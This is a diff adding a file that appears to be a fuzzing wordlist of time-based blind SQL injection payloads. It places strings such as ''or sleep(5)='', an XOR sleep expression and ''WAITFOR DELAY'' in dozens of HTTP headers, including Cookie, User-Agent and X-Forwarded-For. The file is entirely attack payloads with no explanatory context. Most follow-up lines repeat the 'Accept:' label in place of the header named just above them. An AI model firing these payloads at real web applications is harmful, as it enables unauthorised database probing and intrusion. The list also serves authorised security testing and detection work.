@@ -1,0 +1,118 @@
+
+Accept: "'or sleep(5)='" 
+Accept:0'XOR(if (now()=sysdate(), sleep(5),0))XOR'Z
+Accept:';WAITFOR DELAY '0:0:10'--
+Accept-charset: "'or sleep(5)='"
+Accept:0'XOR(if (now()=sysdate(), sleep(5),0))XOR'Z 
+Accept:';WAITFOR DELAY '0:0:10'--
+Accept-Datetime: "'or sleep(5)='" 
+Accept:0'XOR(if (now()=sysdate(), sleep(5),0))XOR'Z
+Accept:';WAITFOR DELAY '0:0:10'--
+Accept-Encoding:"'or sleep(5)='" 
+Accept:0'XOR(if (now()=sysdate(), sleep(5),0))XOR'Z
+Accept:';WAITFOR DELAY '0:0:10'--
+Accept-Language:"'or sleep(5)='" 
+Accept:0'XOR(if (now()=sysdate(), sleep(5),0))XOR'Z
+Accept:';WAITFOR DELAY '0:0:10'--
+Authorization: "'or sleep(5)='" 
+Accept:0'XOR(if (now()=sysdate(), sleep(5),0))XOR'Z
+Accept:';WAITFOR DELAY '0:0:10'--
+Cache-Control:"'or sleep(5)='" 
+Accept:0'XOR(if (now()=sysdate(), sleep(5),0))XOR'Z
+Accept:';WAITFOR DELAY '0:0:10'--
+Connection:"'or sleep(5)='" 
+Accept:0'XOR(if (now()=sysdate(), sleep(5),0))XOR'Z
+Accept:';WAITFOR DELAY '0:0:10'--
+Content-Length: "'or sleep(5)='"  
+Accept:0'XOR(if (now()=sysdate(), sleep(5),0))XOR'Z
+Accept:';WAITFOR DELAY '0:0:10'--
+Content-MD5: "'or sleep(5)='" 
+Accept:0'XOR(if (now()=sysdate(), sleep(5),0))XOR'Z
+Accept:';WAITFOR DELAY '0:0:10'--
+Content-Type: "'or sleep(5)='"  
+Accept:0'XOR(if (now()=sysdate(), sleep(5),0))XOR'Z
+Accept:';WAITFOR DELAY '0:0:10'--
+Cookie:"'or sleep(5)='"  
+Accept:0'XOR(if (now()=sysdate(), sleep(5),0))XOR'Z
+Accept:';WAITFOR DELAY '0:0:10'--
+Date: "'or sleep(5)='" 
+Accept:0'XOR(if (now()=sysdate(), sleep(5),0))XOR'Z
+Accept:';WAITFOR DELAY '0:0:10'--
+Expect: "'or sleep(5)='" 
+Accept:0'XOR(if (now()=sysdate(), sleep(5),0))XOR'Z
+Accept:';WAITFOR DELAY '0:0:10'--
+Forwarded: "'or sleep(5)='" 
+Accept:0'XOR(if (now()=sysdate(), sleep(5),0))XOR'Z
+Accept:';WAITFOR DELAY '0:0:10'--
+From: "'or sleep(5)='" 
+Accept:0'XOR(if (now()=sysdate(), sleep(5),0))XOR'Z
+Accept:';WAITFOR DELAY '0:0:10'--
+If-Match: "'or sleep(5)='" 
+Accept:0'XOR(if (now()=sysdate(), sleep(5),0))XOR'Z
+Accept:';WAITFOR DELAY '0:0:10'--
+If-Modified-Since: "'or sleep(5)='" 
+Accept:0'XOR(if (now()=sysdate(), sleep(5),0))XOR'Z
+Accept:';WAITFOR DELAY '0:0:10'--
+If-None-Match: "'or sleep(5)='" 
+Accept:0'XOR(if (now()=sysdate(), sleep(5),0))XOR'Z
+Accept:';WAITFOR DELAY '0:0:10'--
+If-Range: "'or sleep(5)='" 
+Accept:0'XOR(if (now()=sysdate(), sleep(5),0))XOR'Z
+Accept:';WAITFOR DELAY '0:0:10'--
+If-Unmodified-Since:"'or sleep(5)='" 
+Accept:0'XOR(if (now()=sysdate(), sleep(5),0))XOR'Z
+Accept:';WAITFOR DELAY '0:0:10'--
+Max-Forwards:"'or sleep(5)='" 
+Accept:0'XOR(if (now()=sysdate(), sleep(5),0))XOR'Z
+Accept:';WAITFOR DELAY '0:0:10'--
+Origin: "'or sleep(5)='" 
+Accept:0'XOR(if (now()=sysdate(), sleep(5),0))XOR'Z
+Accept:';WAITFOR DELAY '0:0:10'--
+Pragma: "'or sleep(5)='" 
+Accept:0'XOR(if (now()=sysdate(), sleep(5),0))XOR'Z
+Accept:';WAITFOR DELAY '0:0:10'--
+Proxy-Authorization:"'or sleep(5)='" 
+Accept:0'XOR(if (now()=sysdate(), sleep(5),0))XOR'Z
+Accept:';WAITFOR DELAY '0:0:10'--
+Range: "'or sleep(5)='" 
+Accept:0'XOR(if (now()=sysdate(), sleep(5),0))XOR'Z
+Accept:';WAITFOR DELAY '0:0:10'--
+Referer: "'or sleep(5)='" 
+Accept:0'XOR(if (now()=sysdate(), sleep(5),0))XOR'Z
+Accept:';WAITFOR DELAY '0:0:10'--
+TE:"'or sleep(5)='" 
+Accept:0'XOR(if (now()=sysdate(), sleep(5),0))XOR'Z
+Accept:';WAITFOR DELAY '0:0:10'--
+Upgrade: "'or sleep(5)='" 
+Accept:0'XOR(if (now()=sysdate(), sleep(5),0))XOR'Z
+Accept:';WAITFOR DELAY '0:0:10'--
+User-Agent:"'or sleep(5)='" 
+Accept:0'XOR(if (now()=sysdate(), sleep(5),0))XOR'Z
+Accept:';WAITFOR DELAY '0:0:10'--
+Via: "'or sleep(5)='" 
+Accept:0'XOR(if (now()=sysdate(), sleep(5),0))XOR'Z
+Accept:';WAITFOR DELAY '0:0:10'--
+Warning: "'or sleep(5)='" 
+Accept:0'XOR(if (now()=sysdate(), sleep(5),0))XOR'Z
+Accept:';WAITFOR DELAY '0:0:10'--
+X-Client-IP: "'or sleep(5)='" 
+Accept:0'XOR(if (now()=sysdate(), sleep(5),0))XOR'Z
+Accept:';WAITFOR DELAY '0:0:10'--
+X-Remote-IP: "'or sleep(5)='" 
+Accept:0'XOR(if (now()=sysdate(), sleep(5),0))XOR'Z
+Accept:';WAITFOR DELAY '0:0:10'--
+X-Remote-Addr: "'or sleep(5)='" 
+Accept:0'XOR(if (now()=sysdate(), sleep(5),0))XOR'Z
+Accept:';WAITFOR DELAY '0:0:10'--
+X-Forwarded-For: "'or sleep(5)='" 
+Accept:0'XOR(if (now()=sysdate(), sleep(5),0))XOR'Z
+Accept:';WAITFOR DELAY '0:0:10'--
+X-Originating-IP: "'or sleep(5)='" 
+Accept:0'XOR(if (now()=sysdate(), sleep(5),0))XOR'Z
+Accept:';WAITFOR DELAY '0:0:10'--
+X-Host: "'or sleep(5)='" 
+Accept:0'XOR(if (now()=sysdate(), sleep(5),0))XOR'Z
+Accept:';WAITFOR DELAY '0:0:10'--
+X-Forwarded-Host: "'or sleep(5)='" 
+Accept:0'XOR(if (now()=sysdate(), sleep(5),0))XOR'Z
+Accept:';WAITFOR DELAY '0:0:10'--
